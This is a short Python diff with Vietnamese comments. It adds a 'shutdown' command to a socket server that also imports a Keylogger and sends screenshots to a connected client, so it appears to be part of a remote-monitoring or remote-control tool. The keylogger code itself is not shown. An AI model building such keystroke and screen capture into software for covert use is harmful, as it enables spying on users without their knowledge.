@@ -3,7 +3,7 @@ import threading
 from PIL import ImageGrab  # Để chụp màn hình
 import io
 from keylogger import Keylogger
-
+from shutdown import ServerShutdownWindow
 
 class Server:
     def __init__(self):
@@ -78,10 +78,12 @@ class Server:
             client_socket.sendall(str(len(screenshot)).encode())  # Gửi kích thước trước
             client_socket.sendall(screenshot)  # Gửi dữ liệu hình ảnh
             return None  # Không cần trả về gì ở đây
+        elif request == "shutdown":
+            shutdown_window = ServerShutdownWindow(self)
+            shutdown_window.start()
+            return "Server đã tắt"
         else:
             return "Invalid request."
-
-
 
     def capture_screenshot(self):
         try:
